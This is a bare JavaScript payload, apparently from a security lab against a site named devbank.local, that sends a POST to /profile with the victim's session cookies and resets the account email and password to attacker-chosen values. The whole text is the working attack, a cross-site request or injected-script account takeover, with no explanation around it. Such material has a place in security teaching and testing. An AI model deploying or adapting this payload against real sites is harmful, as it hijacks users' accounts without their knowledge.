fetch("/profile", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({
        email: "attacker@devbank.local",
        password: "Pwned-A2-2026"
    })
});